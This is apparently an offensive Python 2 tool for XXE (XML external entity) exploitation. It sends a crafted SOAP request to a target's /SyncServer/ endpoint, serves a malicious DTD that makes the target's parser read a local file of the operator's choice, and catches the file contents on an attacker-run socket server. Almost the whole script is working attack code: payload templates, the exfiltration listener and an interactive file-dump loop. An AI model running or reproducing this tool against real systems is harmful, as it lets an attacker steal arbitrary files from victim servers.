#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# author: @090h
from sys import exit
from SocketServer import ThreadingTCPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
from BaseHTTPServer import HTTPServer
from threading import Thread, Event
import netifaces
import socket
from datetime import datetime
import urllib2
from time import sleep
import signal
from argparse import ArgumentParser

############################### Config Vars ###############################
target = '172.16.0.136'
web_host = upload_host = '172.16.0.161'
web_port = 8000
upload_port = 9090
upload_filename = 'noname'

xxe_req_buf = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY %% remote SYSTEM "http://%s:%i/evil.xml">
%%remote;
%%param1;
]>
<root>&external;</root>"""

evil_xml = """<!ENTITY %% payload SYSTEM "file:///%s">
<!ENTITY %% param1 "<!ENTITY external SYSTEM 'http://%s:%s/start_of_file/%%payload;/end_of_file/'>">"""

#TODO: Do it in proper way!
exiting = False
############################### Config vars ###############################


class XXEHandler(SimpleHTTPRequestHandler):

    def evil(self):
        buf = evil_xml % (read_filename, upload_host, upload_port)
        #print buf
        return buf

    def do_GET(self):
        ca = self.client_address
        #print(">>>>>>>>>>>>[%s:%s] requested: %s" % (ca[0], ca[1], self.path))
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

        if self.path == '/evil.xml':
            self.wfile.write(self.evil())
        else:
            self.wfile.write("OK")


class XXEWebServer(Thread):

    def __init__(self, host='0.0.0.0', port=8000, HandlerClass=XXEHandler):
        Thread.__init__(self)
        self._stop = Event()
        self.host = host
        self.port = port
        self.server_address = (self.host, self.port)
        self.HandlerClass = HandlerClass

        if self.HandlerClass is None:
            self.HandlerClass = SimpleHTTPRequestHandler
            self.HandlerClass.protocol_version = "HTTP/1.0"
            self.httpd = HTTPServer(self.server_address, self.HandlerClass)
        else:
            self.httpd = ThreadingTCPServer(self.server_address, self.HandlerClass)

    def stop(self):
        self._stop.set()

    def stopped(self):
        return self._stop.isSet()

    def run(self):
        sa = self.httpd.socket.getsockname()
        print "Serving HTTP on ", sa[0], " port ", sa[1]
        #self.httpd.serve_forever()
        while not self.stopped():
            if exiting: return
            self.httpd.handle_request()


class FileReciveThread(Thread):

    def __init__(self, sock, addr):
        self.sock = sock
        self.addr = addr
        Thread.__init__(self)

    def run(self):
        res = ''
        while 1:
            data = self.sock.recv(1024)
            #print data
            if not data:
                break

            #print("Recived: ", repr(data))
            res += data
            self.sock.send(data)

        print "File recieved: ", res.split('/start_of_file/')[0].split('/end_of_file/')[0]
        self.sock.close()


class FileReciveServer(Thread):

    def __init__(self, host='0.0.0.0', port=9090,):
        Thread.__init__(self)
        self.host = host
        self.port = port
        self.server_address = (self.host, self.port)

    def run(self):
        print("Starting file recive server @ %s:%i" % (self.host, self.port))
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(self.server_address)
        self.sock.listen(5)

        while True:
            if exiting: return
            sock, addr = self.sock.accept()
            print '[FileReciveServer][%s] connection from %s' % (datetime.now().strftime("%Y-%m-%d %H:%M"), addr,)
            #FileReciveThread(sock, addr).start()
            res = ''
            #while 1:
            data = sock.recv(1024)
            #print data
            if not data:
                break
            #print("Recived: ", repr(data))
            res += data
            sock.send(data)
            print "File recieved: ", res.split('/start_of_file/')[1].split('/end_of_file/')[0]
            sock.close()


class XXEClient:

    def get_self_ip(self, ):
        return socket.gethostbyname(socket.gethostname())

    def send_request_tcp(self, host, port, buf):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send(buf)
        result = s.recv(1024)
        print result
        s.close()
        return result

    def send_request_http(self, target, data):
        headers = {"User-Agent": "Opera/9.64 (Windows NT 5.1; U; en) Presto/2.1.1",
               "Accept": "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1",
               "Accept-Language": "ru,uk-UA;q=0.9,uk;q=0.8,en;q=0.7",
               "Accept-Charset": "iso-8859-1, utf-8, utf-16, *;q=0.1",
               "Accept-Encoding": "identity, *;q=0",
               "Connection": "Keep-Alive",
               "SOAPAction": "QAS_LOGIN_MSG"}

        url = "http://%s/SyncServer/" % target
        request = urllib2.Request(url, data, headers)
        return urllib2.urlopen(request).read().decode("UTF-8", "replace")

    @staticmethod
    def get_ip():
        interfaces = netifaces.interfaces()
        x = 1
        ip = {}
        for i in interfaces:
            #skip loopbak iface
            if i == 'lo':
                continue

            iface = netifaces. ifaddresses(i).get(netifaces.AF_INET)
            if iface is not None:
                for j in iface:
                    if j['addr'] != '127.0.0.1':
                        print("%s. %s -> %s" % (x, i, j['addr']))
                        ip[x] = j['addr']
                        x += 1
        c = raw_input('Enter iface ip number: ')
        return ip[int(c)]

def start_server():
    print("Starting XXE server..")
    xs = XXEWebServer(web_host, web_port, XXEHandler)
    xs.start()
    sleep(1)
    fs = FileReciveServer(upload_host, upload_port)
    fs.start()
    sleep(1)

if __name__ == '__main__':
    parser = ArgumentParser(description='XXE exploitation script.')
    parser.add_argument('--version', action='version', version='%(prog)s 0.2')
    parser.add_argument('-u', '--url', required=True, help='url for HTTP query')
    parser.add_argument('-i', '--ip', required=True, help='ip for port binding')
    parser.add_argument('-p', '--port', required=False, help='port for IO activity')
    parser.add_argument('-d', '--data', required=False, help='data to send to victim')
    parser.add_argument('-D', '--data-file', required=False, help='data to send to victim stored in file')
    parser.add_argument('-f', '--filename', required=False, help="file to dump")
    parser.add_argument('-F', '--filename-list', required=False, help="file containing file list to dump")
    args = parser.parse_args()
    start_time = datetime.now()

    start_server()
    c = XXEClient()

    print("Enter files to retrive. Blank means exit.")
    try:
        while True:
            read_filename = raw_input('filename > ')
            if read_filename == 'exit':
                exiting = True
                exit()

            elif read_filename == '':
                continue
            else:
                buf = xxe_req_buf % (web_host, web_port)
                resp = c.send_request_http(target, buf)
                if resp.find("FileNotFoundException") != -1:
                    print "FILE_NOT_FOUND"

    except (KeyboardInterrupt, SystemExit):
        exit()


    print "Start time: " + start_time.strftime('%Y-%m-%d %H:%M:%S')
    print "Finish time: " + datetime.now().strftime('%Y-%m-%d %H:%M:%S')




